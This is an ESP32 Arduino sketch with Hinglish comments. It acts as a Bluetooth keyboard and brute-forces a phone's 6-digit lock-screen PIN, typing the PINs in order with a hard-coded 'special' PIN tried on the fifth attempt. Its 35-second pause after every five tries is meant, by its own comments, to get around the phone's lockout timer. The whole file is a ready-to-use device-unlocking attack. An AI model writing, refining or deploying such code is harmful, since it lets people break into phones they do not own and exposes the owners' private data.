#include <Arduino.h>
#include <BleKeyboard.h>

BleKeyboard bleKeyboard("ESP32 Keyboard", "Espressif", 100);

const uint16_t KEY_DELAY = 120;        // Digits ke beech ka delay (ms)
const uint16_t ATTEMPT_DELAY = 1500;   // Har PIN try karne ke baad delay (ms)
const uint8_t COOLDOWN_SECONDS = 35;   // 5 attempts ke baad kitne second rukna hai

const uint32_t SPECIAL_NUMBER = 852995;
const uint8_t SPECIAL_AT = 5;

// Screen wake up aur PIN input field active karne ke liye
void wakeAndActivateScreen() {
  bleKeyboard.write(KEY_RETURN);
  delay(300);
  bleKeyboard.write(KEY_RETURN);
  delay(500);
}

// 6-digit PIN enter karne ka function
void typePin(uint32_t pin) {
  char pinStr[7];
  snprintf(pinStr, sizeof(pinStr), "%06lu", (unsigned long)pin);

  for (uint8_t i = 0; i < 6; i++) {
    bleKeyboard.print(pinStr[i]);
    delay(KEY_DELAY);
  }

  // Enter dabana PIN submit karne ke liye
  bleKeyboard.write(KEY_RETURN);
  delay(ATTEMPT_DELAY);
}

void setup() {
  Serial.begin(115200);
  bleKeyboard.begin();

  Serial.println("Waiting for phone to connect via Bluetooth...");

  while (!bleKeyboard.isConnected()) {
    delay(100);
  }

  Serial.println("Connected!");
  delay(3000); // Bluetooth stabilize hone ka wait

  uint32_t number = 0;
  uint16_t count = 0;

  while (true) {
    // Agar beech mein disconnect ho jaye toh wait karein
    if (!bleKeyboard.isConnected()) {
      Serial.println("Disconnected! Waiting for reconnect...");
      while (!bleKeyboard.isConnected()) {
        delay(200);
      }
      delay(2000);
    }

    count++;

    // Screen wake up request
    wakeAndActivateScreen();

    // Specific PIN test logic
    if (count == SPECIAL_AT) {
      Serial.printf("Attempt %u: Trying Special PIN -> %06lu\n", count, (unsigned long)SPECIAL_NUMBER);
      typePin(SPECIAL_NUMBER);
    } else {
      Serial.printf("Attempt %u: Trying PIN -> %06lu\n", count, (unsigned long)number);
      typePin(number);
      number++;

      if (number > 999999) {
        number = 0;
      }
    }

    // Har 5 attempts ke baad 35 seconds ka pause (phone lockout timer se bachne ke liye)
    if (count % 5 == 0) {
      Serial.println(">>> 5 attempts complete. Pausing for 35s to clear phone lockout timer...");
      for (int i = COOLDOWN_SECONDS; i > 0; i--) {
        Serial.printf("Resuming in %d seconds...\n", i);
        delay(1000);
      }
      Serial.println(">>> Cooldown finished. Resuming next attempts...");
    }
  }
}

void loop() {
  // Logic setup() ke infinite loop mein run ho raha hai
}